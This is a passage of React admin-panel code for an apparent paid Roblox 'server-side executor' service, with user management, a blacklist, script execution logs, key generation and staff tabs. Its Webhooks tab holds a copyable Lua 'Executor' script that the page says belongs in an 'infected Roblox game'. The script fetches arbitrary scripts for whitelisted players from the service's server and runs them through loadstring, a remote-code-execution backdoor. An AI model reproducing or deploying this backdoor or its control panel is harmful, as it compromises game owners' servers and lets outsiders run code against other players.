                                  className="p-1 rounded text-muted-foreground hover:text-foreground transition-colors"
                                >
                                  {copied === `ip-${u.id}` ? <Check className="h-3 w-3 text-green-500" /> : <Copy className="h-3 w-3" />}
                                </button>
                              </div>
                            </td>
                            <td className="p-4">
                              <span className={`inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium ${
                                u.isOnline ? "bg-green-500/20 text-green-500" : "bg-muted text-muted-foreground"
                              }`}>
                                <span className={`h-1.5 w-1.5 rounded-full ${u.isOnline ? "bg-green-500" : "bg-muted-foreground"}`} />
                                {u.isOnline ? "Online" : "Offline"}
                              </span>
                            </td>
                            <td className="p-4">
                              {u.role !== "owner" && (
                                <div className="flex items-center gap-2">
                                  <button
                                    onClick={() => handleForceLogout(u.username)}
                                    className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors"
                                    title="Force Logout"
                                  >
                                    <LogOut className="h-4 w-4" />
                                  </button>
                                  <button
                                    onClick={() => setBlacklistModal({ open: true, username: u.username })}
                                    className="p-2 rounded-lg text-destructive hover:bg-destructive/10 transition-colors"
                                    title="Blacklist"
                                  >
                                    <UserX className="h-4 w-4" />
                                  </button>
                                </div>
                              )}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* Blacklist */}
              {adminTab === "blacklist" && (
                <div className="glass rounded-xl border border-border/30 overflow-hidden">
                  {blacklistedUsers.length === 0 ? (
                    <div className="p-8 text-center">
                      <UserX className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                      <p className="text-muted-foreground">No blacklisted users</p>
                    </div>
                  ) : (
                    <div className="overflow-x-auto">
                      <table className="w-full">
                        <thead>
                          <tr className="border-b border-border/30 bg-muted/30">
                            <th className="text-left p-4 text-sm font-semibold text-foreground">User</th>
                            <th className="text-left p-4 text-sm font-semibold text-foreground">Reason</th>
                            <th className="text-left p-4 text-sm font-semibold text-foreground">Blacklisted By</th>
                            <th className="text-left p-4 text-sm font-semibold text-foreground">Date</th>
                            <th className="text-left p-4 text-sm font-semibold text-foreground">Actions</th>
                          </tr>
                        </thead>
                        <tbody>
                          {blacklistedUsers.map((u) => (
                            <tr key={u.id} className="border-b border-border/30 last:border-0">
                              <td className="p-4 font-medium text-foreground">{u.username}</td>
                              <td className="p-4 text-sm text-muted-foreground max-w-xs truncate">{u.reason}</td>
                              <td className="p-4 text-sm text-muted-foreground">{u.blacklistedBy}</td>
                              <td className="p-4 text-sm text-muted-foreground">{new Date(u.blacklistedAt).toLocaleDateString()}</td>
                              <td className="p-4">
                                <button
                                  onClick={() => handleUnblacklist(u.username)}
                                  className="inline-flex items-center gap-1 px-3 py-1.5 rounded-lg bg-green-500/10 text-green-500 text-xs font-medium hover:bg-green-500/20 transition-colors"
                                >
                                  <Check className="h-3 w-3" />
                                  Unblacklist
                                </button>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
)}
              </div>
              )}

              {/* Script Logs Tab */}
              {adminTab === "logs" && (
                <div className="space-y-4">
                  <div className="glass rounded-xl border border-border/30 overflow-hidden">
                    <div className="p-4 border-b border-border/30 flex items-center justify-between">
                      <h3 className="font-semibold text-foreground flex items-center gap-2">
                        <ScrollText className="h-5 w-5 text-primary" />
                        Script Execution Logs ({scriptLogs.length})
                      </h3>
                      <button
                        onClick={fetchScriptLogs}
                        className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
                      >
                        <RefreshCw className="h-4 w-4" />
                      </button>
                    </div>
                    <div className="overflow-x-auto max-h-[500px] overflow-y-auto">
                      <table className="w-full">
                        <thead className="sticky top-0 bg-muted/50">
                          <tr className="border-b border-border/30">
                            <th className="text-left p-3 text-sm font-semibold text-foreground">User</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Roblox</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Game</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Script</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Time</th>
                          </tr>
                        </thead>
                        <tbody>
                          {scriptLogs.length === 0 ? (
                            <tr>
                              <td colSpan={5} className="p-8 text-center text-muted-foreground">
                                No script logs yet
                              </td>
                            </tr>
                          ) : (
                            scriptLogs.map((log) => (
                              <tr key={log.id} className="border-b border-border/30 last:border-0">
                                <td className="p-3 text-sm text-foreground">{log.username}</td>
                                <td className="p-3 text-sm text-primary">{log.robloxUsername}</td>
                                <td className="p-3 text-sm text-muted-foreground">{log.gameName}</td>
                                <td className="p-3">
                                  <code className="text-xs font-mono bg-muted px-2 py-1 rounded text-foreground max-w-xs truncate block">
                                    {log.script.length > 50 ? log.script.substring(0, 50) + "..." : log.script}
                                  </code>
                                </td>
                                <td className="p-3 text-xs text-muted-foreground">
                                  {new Date(log.timestamp).toLocaleString()}
                                </td>
                              </tr>
                            ))
                          )}
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              )}
  
              {/* Keys - Owner Only */}
              {adminTab === "keys" && isOwner && (
                <div className="space-y-6">
                  {/* Generate Keys */}
                  <div className="glass rounded-xl border border-border/30 p-6">
                    <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
                      <Plus className="h-5 w-5 text-primary" />
                      Generate Keys
                    </h3>
                    <div className="flex gap-3">
                      <button
                        onClick={() => generateKey("standard")}
                        className="flex-1 py-3 rounded-lg bg-green-500/20 border border-green-500/30 text-green-400 font-semibold hover:bg-green-500/30 transition-all"
                      >
                        Generate Standard Key
                      </button>
                      <button
                        onClick={() => generateKey("premium")}
                        className="flex-1 py-3 rounded-lg bg-primary/20 border border-primary/30 text-primary font-semibold hover:bg-primary/30 transition-all"
                      >
                        Generate Premium Key
                      </button>
                    </div>
                  </div>

                  {/* Keys List */}
                  <div className="glass rounded-xl border border-border/30 overflow-hidden">
                    <div className="p-4 border-b border-border/30">
                      <h3 className="font-semibold text-foreground">All Keys ({whitelistKeys.length})</h3>
                    </div>
                    <div className="overflow-x-auto max-h-96 overflow-y-auto">
                      <table className="w-full">
                        <thead className="sticky top-0 bg-muted/50">
                          <tr className="border-b border-border/30">
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Key</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Plan</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Status</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Used By</th>
                            <th className="text-left p-3 text-sm font-semibold text-foreground">Actions</th>
                          </tr>
                        </thead>
                        <tbody>
                          {whitelistKeys.length === 0 ? (
                            <tr>
                              <td colSpan={5} className="p-8 text-center text-muted-foreground">
                                No keys generated yet
                              </td>
                            </tr>
                          ) : (
                            whitelistKeys.map((k) => (
                              <tr key={k.key} className="border-b border-border/30 last:border-0">
                                <td className="p-3">
                                  <div className="flex items-center gap-2">
                                    <code className="text-xs font-mono text-foreground bg-muted px-2 py-1 rounded">{k.key}</code>
                                    <button
                                      onClick={() => copyToClipboard(k.key, k.key)}
                                      className="p-1 text-muted-foreground hover:text-foreground"
                                    >
                                      {copied === k.key ? <Check className="h-3 w-3 text-green-500" /> : <Copy className="h-3 w-3" />}
                                    </button>
                                  </div>
                                </td>
                                <td className="p-3">
                                  <span className={`px-2 py-1 rounded text-xs font-semibold ${
                                    k.plan === "premium" ? "bg-primary/20 text-primary" : "bg-green-500/20 text-green-400"
                                  }`}>
                                    {k.plan.toUpperCase()}
                                  </span>
                                </td>
                                <td className="p-3">
                                  <span className={`px-2 py-1 rounded text-xs font-semibold ${
                                    k.usedBy ? "bg-muted text-muted-foreground" : "bg-green-500/20 text-green-400"
                                  }`}>
                                    {k.usedBy ? "USED" : "AVAILABLE"}
                                  </span>
                                </td>
                                <td className="p-3 text-sm text-muted-foreground">
                                  {k.usedBy || "-"}
                                </td>
                                <td className="p-3">
                                  <button
                                    onClick={() => deleteKey(k.id)}
                                    className="p-2 rounded-lg text-destructive hover:bg-destructive/10 transition-colors"
                                    title="Delete"
                                  >
                                    <Trash2 className="h-4 w-4" />
                                  </button>
                                </td>
                              </tr>
                            ))
                          )}
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              )}
  
{/* Webhooks - Owner Only */}
              {adminTab === "webhooks" && isOwner && (
                <div className="space-y-6">
                  {/* Roblox Whitelist Webhook - Most Important */}
                  <div className="glass rounded-xl border border-green-500/30 p-6 bg-green-500/5">
                    <div className="mb-4">
                      <h3 className="font-semibold text-foreground flex items-center gap-2">
                        <Users className="h-5 w-5 text-green-500" />
                        Roblox Whitelist Webhook
                      </h3>
                      <p className="text-sm text-muted-foreground mt-1">Use this URL in your Roblox script to get the list of whitelisted users</p>
                    </div>
                    <div className="flex items-center gap-2 bg-muted/50 rounded-lg p-3 border border-border/30">
                      <code className="flex-1 text-sm font-mono text-foreground break-all">
                        {`${siteUrl}${robloxWebhookUrl}`}
                      </code>
                      <button
                        onClick={() => copyToClipboard(`${siteUrl}${robloxWebhookUrl}`, "roblox-webhook")}
                        className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
                      >
                        {copied === "roblox-webhook" ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                      </button>
                    </div>
                    <div className="mt-4 p-3 rounded-lg bg-muted/30 border border-border/30">
                      <p className="text-xs text-muted-foreground mb-2">Response format (JSON array of Roblox usernames):</p>
                      <code className="text-xs font-mono text-green-400">["Sofiane_OG", "mohsayt", "natilololool", "roblox_user123"]</code>
                    </div>
                  </div>

                  <div className="glass rounded-xl border border-border/30 p-6">
                    <div className="mb-4">
                      <h3 className="font-semibold text-foreground flex items-center gap-2">
                        <Key className="h-5 w-5 text-primary" />
                        Game Webhook Key
                      </h3>
                      <p className="text-sm text-muted-foreground mt-1">Use this key to authenticate webhook requests from Roblox games</p>
                    </div>
                    <div className="flex items-center gap-2 bg-muted/50 rounded-lg p-3 border border-border/30">
                      <code className="flex-1 text-sm font-mono text-foreground break-all">{webhookKey || "Loading..."}</code>
                      <button
                        onClick={() => copyToClipboard(webhookKey, "webhook-key")}
                        className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
                      >
                        {copied === "webhook-key" ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                      </button>
                    </div>
                  </div>

                  <div className="glass rounded-xl border border-border/30 p-6">
                    <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
                      <Globe className="h-5 w-5 text-primary" />
                      Webhook URL
                    </h3>
                    <div className="flex items-center gap-2 bg-muted/50 rounded-lg p-3 border border-border/30">
                      <code className="flex-1 text-sm font-mono text-foreground">{`${siteUrl}/api/webhook`}</code>
                      <button
                        onClick={() => copyToClipboard(`${siteUrl}/api/webhook`, "webhook-url")}
                        className="p-2 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
                      >
                        {copied === "webhook-url" ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                      </button>
                    </div>
                  </div>

                  <div className="glass rounded-xl border border-border/30 p-6">
                    <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
                      <FileText className="h-5 w-5 text-primary" />
                      Roblox Lua Script Example
                    </h3>
                    <p className="text-sm text-muted-foreground mb-4">Copy this script and modify it for your Roblox game to automatically send game data</p>
                    <div className="bg-[#1a1a2e] rounded-lg p-4 border border-border/30 overflow-x-auto">
                      <pre className="text-sm font-mono text-green-400 whitespace-pre-wrap">{`-- Moon Server-Side Webhook Script
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "${siteUrl}/api/webhook"
local WEBHOOK_KEY = "${webhookKey || "YOUR_WEBHOOK_KEY"}"

-- Add game on server start
local function addGame()
    local success, err = pcall(function()
        local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
            webhookKey = WEBHOOK_KEY,
            action = "addGame",
            gameData = {
                placeId = tostring(game.PlaceId),
                name = gameInfo.Name,
                players = #Players:GetPlayers(),
                gameUrl = "https://www.roblox.com/games/" .. game.PlaceId
            }
        }), Enum.HttpContentType.ApplicationJson)
    end)
    if not success then warn("[Moon] Webhook error:", err) end
end

-- Update player count periodically
local function updatePlayers()
    while true do
        wait(30)
        pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
                webhookKey = WEBHOOK_KEY,
                action = "updateGame",
                gameData = {
                    placeId = tostring(game.PlaceId),
                    players = #Players:GetPlayers()
                }
            }), Enum.HttpContentType.ApplicationJson)
        end)
    end
end

addGame()
spawn(updatePlayers)`}</pre>
                    </div>
                    <button
                      onClick={() => copyToClipboard(`-- Moon Server-Side Webhook Script
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "${siteUrl}/api/webhook"
local WEBHOOK_KEY = "${webhookKey || "YOUR_WEBHOOK_KEY"}"

local function addGame()
    local success, err = pcall(function()
        local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
            webhookKey = WEBHOOK_KEY,
            action = "addGame",
            gameData = {
                placeId = tostring(game.PlaceId),
                name = gameInfo.Name,
                players = #Players:GetPlayers(),
                gameUrl = "https://www.roblox.com/games/" .. game.PlaceId
            }
        }), Enum.HttpContentType.ApplicationJson)
    end)
    if not success then warn("[Moon] Webhook error:", err) end
end

local function updatePlayers()
    while true do
        wait(30)
        pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
                webhookKey = WEBHOOK_KEY,
                action = "updateGame",
                gameData = {
                    placeId = tostring(game.PlaceId),
                    players = #Players:GetPlayers()
                }
            }), Enum.HttpContentType.ApplicationJson)
        end)
    end
end

addGame()
spawn(updatePlayers)`, "lua-script")}
                      className="mt-4 inline-flex items-center gap-2 rounded-lg bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-all"
                    >
                      {copied === "lua-script" ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                      Copy Script
                    </button>
                  </div>

                  <div className="glass rounded-xl border border-primary/30 p-6 bg-primary/5">
                    <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
                      <Terminal className="h-5 w-5 text-primary" />
                      Executor Lua Script (IMPORTANT)
                    </h3>
                    <p className="text-sm text-muted-foreground mb-4">Copy this script to your infected Roblox game. It will check for whitelisted users and execute their queued scripts.</p>
                    <div className="bg-[#1a1a2e] rounded-lg p-4 border border-border/30 overflow-x-auto max-h-96">
                      <pre className="text-sm font-mono text-green-400 whitespace-pre-wrap">{`-- Moon Server-Side Executor
-- Put this in ServerScriptService

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "${siteUrl}"
local WEBHOOK_KEY = "${webhookKey || "YOUR_WEBHOOK_KEY"}"

local WHITELIST_URL = WEBHOOK_URL .. "/api/whitelist?webhookKey=" .. WEBHOOK_KEY
local EXECUTOR_URL = WEBHOOK_URL .. "/api/executor"
local GAME_WEBHOOK_URL = WEBHOOK_URL .. "/api/webhook"

local whitelistedUsers = {}
local lastFetch = 0

-- Register this game on the website
local function registerGame()
    local s, r = pcall(function()
        local placeId = game.PlaceId
        local gameName = "Unknown Game"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(placeId)
            gameName = info.Name
        end)
        local body = HttpService:JSONEncode({
            webhookKey = WEBHOOK_KEY,
            action = "addGame",
            gameData = {
                placeId = tostring(placeId),
                name = gameName,
                players = #Players:GetPlayers()
            }
        })
        return HttpService:PostAsync(GAME_WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
    end)
    if s then print("[Moon] Game registered!") else warn("[Moon] Failed to register game") end
end

-- Fetch whitelist
local function fetchWhitelist()
    local s, r = pcall(function()
        local res = HttpService:GetAsync(WHITELIST_URL)
        return HttpService:JSONDecode(res)
    end)
    if s and type(r) == "table" then
        whitelistedUsers = {}
        for _, u in ipairs(r) do
            whitelistedUsers[string.lower(u)] = true
        end
    end
    lastFetch = tick()
end

-- Check whitelist
local function isWhitelisted(plr)
    return whitelistedUsers[string.lower(plr.Name)] == true
end

-- Execute scripts for player
local function execScripts(plr)
    if not isWhitelisted(plr) then return end
    local url = EXECUTOR_URL .. "?webhookKey=" .. WEBHOOK_KEY .. "&robloxUser=" .. plr.Name .. "&action=fetch"
    local s, r = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync(url))
    end)
    if s and r and r.scripts then
        for _, script in ipairs(r.scripts) do
            pcall(function() loadstring(script)() end)
        end
    end
end

-- Main loop
spawn(function()
    while true do
        if tick() - lastFetch > 30 then fetchWhitelist() end
        for _, p in ipairs(Players:GetPlayers()) do
            if isWhitelisted(p) then execScripts(p) end
        end
        wait(5)
    end
end)

registerGame()
fetchWhitelist()
Players.PlayerAdded:Connect(function() if tick() - lastFetch > 5 then fetchWhitelist() end end)
print("[Moon] Executor loaded!")`}</pre>
                    </div>
                    <button
                      onClick={() => copyToClipboard(`-- Moon Server-Side Executor
-- Put this in ServerScriptService

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "${siteUrl}"
local WEBHOOK_KEY = "${webhookKey || "YOUR_WEBHOOK_KEY"}"

local WHITELIST_URL = WEBHOOK_URL .. "/api/whitelist?webhookKey=" .. WEBHOOK_KEY
local EXECUTOR_URL = WEBHOOK_URL .. "/api/executor"
local GAME_WEBHOOK_URL = WEBHOOK_URL .. "/api/webhook"

local whitelistedUsers = {}
local lastFetch = 0

local function registerGame()
    local s, r = pcall(function()
        local placeId = game.PlaceId
        local gameName = "Unknown Game"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(placeId)
            gameName = info.Name
        end)
        local body = HttpService:JSONEncode({
            webhookKey = WEBHOOK_KEY,
            action = "addGame",
            gameData = {
                placeId = tostring(placeId),
                name = gameName,
                players = #Players:GetPlayers()
            }
        })
        return HttpService:PostAsync(GAME_WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
    end)
    if s then print("[Moon] Game registered!") else warn("[Moon] Failed to register game") end
end

local function fetchWhitelist()
    local s, r = pcall(function()
        local res = HttpService:GetAsync(WHITELIST_URL)
        return HttpService:JSONDecode(res)
    end)
    if s and type(r) == "table" then
        whitelistedUsers = {}
        for _, u in ipairs(r) do
            whitelistedUsers[string.lower(u)] = true
        end
    end
    lastFetch = tick()
end

local function isWhitelisted(plr)
    return whitelistedUsers[string.lower(plr.Name)] == true
end

local function execScripts(plr)
    if not isWhitelisted(plr) then return end
    local url = EXECUTOR_URL .. "?webhookKey=" .. WEBHOOK_KEY .. "&robloxUser=" .. plr.Name .. "&action=fetch"
    local s, r = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync(url))
    end)
    if s and r and r.scripts then
        for _, script in ipairs(r.scripts) do
            pcall(function() loadstring(script)() end)
        end
    end
end

spawn(function()
    while true do
        if tick() - lastFetch > 30 then fetchWhitelist() end
        for _, p in ipairs(Players:GetPlayers()) do
            if isWhitelisted(p) then execScripts(p) end
        end
        wait(5)
    end
end)

registerGame()
fetchWhitelist()
Players.PlayerAdded:Connect(function() if tick() - lastFetch > 5 then fetchWhitelist() end end)
print("[Moon] Executor loaded!")`, "executor-script")}
                      className="mt-4 inline-flex items-center gap-2 rounded-lg bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-all"
                    >
                      {copied === "executor-script" ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                      Copy Executor Script
                    </button>
                  </div>

                  <div className="glass rounded-xl border border-border/30 p-6">
                    <h3 className="font-semibold text-foreground mb-4">API Actions</h3>
                    <div className="space-y-4">
                      <div className="p-4 rounded-lg bg-muted/30 border border-border/30">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="px-2 py-0.5 rounded bg-green-500/20 text-green-500 text-xs font-mono">POST</span>
                          <span className="font-medium text-foreground">addGame</span>
                        </div>
                        <p className="text-sm text-muted-foreground">Adds a new game to the list. Required: placeId, name</p>
                      </div>
                      <div className="p-4 rounded-lg bg-muted/30 border border-border/30">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="px-2 py-0.5 rounded bg-yellow-500/20 text-yellow-500 text-xs font-mono">POST</span>
                          <span className="font-medium text-foreground">updateGame</span>
                        </div>
                        <p className="text-sm text-muted-foreground">Updates player count or status. Required: placeId</p>
                      </div>
                      <div className="p-4 rounded-lg bg-muted/30 border border-border/30">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-500 text-xs font-mono">POST</span>
                          <span className="font-medium text-foreground">removeGame</span>
                        </div>
                        <p className="text-sm text-muted-foreground">Removes a game from the list. Required: placeId</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Staff - Owner Only */}
              {adminTab === "staff" && isOwner && (
                <div className="space-y-4">
                  <div className="flex justify-end">
                    <button
                      onClick={() => setStaffModal(true)}
                      className="inline-flex items-center gap-2 rounded-lg bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-all"
                    >
                      <UserPlus className="h-4 w-4" />
                      Create Staff
                    </button>
                  </div>
                  <div className="glass rounded-xl border border-border/30 overflow-hidden">
                    {staffAccounts.length === 0 ? (
                      <div className="p-8 text-center">
                        <Shield className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                        <p className="text-muted-foreground">No staff accounts created</p>
                      </div>
                    ) : (
                      <div className="overflow-x-auto">
                        <table className="w-full">
                          <thead>
                            <tr className="border-b border-border/30 bg-muted/30">
                              <th className="text-left p-4 text-sm font-semibold text-foreground">Username</th>
                              <th className="text-left p-4 text-sm font-semibold text-foreground">Email</th>
                              <th className="text-left p-4 text-sm font-semibold text-foreground">Created</th>
                              <th className="text-left p-4 text-sm font-semibold text-foreground">Status</th>
                              <th className="text-left p-4 text-sm font-semibold text-foreground">Actions</th>
                            </tr>
                          </thead>
                          <tbody>
                            {staffAccounts.map((staff) => (
                              <tr key={staff.id} className="border-b border-border/30 last:border-0">
                                <td className="p-4 font-medium text-foreground">{staff.username}</td>
                                <td className="p-4 text-sm text-muted-foreground">{staff.email}</td>
                                <td className="p-4 text-sm text-muted-foreground">{new Date(staff.createdAt).toLocaleDateString()}</td>
                                <td className="p-4">
                                  <span className={`inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium ${
                                    staff.isOnline ? "bg-green-500/20 text-green-500" : "bg-muted text-muted-foreground"
                                  }`}>
                                    <span className={`h-1.5 w-1.5 rounded-full ${staff.isOnline ? "bg-green-500" : "bg-muted-foreground"}`} />
                                    {staff.isOnline ? "Online" : "Offline"}
                                  </span>
                                </td>
                                <td className="p-4">
                                  <button
                                    onClick={() => handleDeleteStaff(staff.username)}
                                    className="p-2 rounded-lg text-destructive hover:bg-destructive/10 transition-colors"
                                    title="Delete Staff"
                                  >
                                    <Trash2 className="h-4 w-4" />
                                  </button>
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  )
}
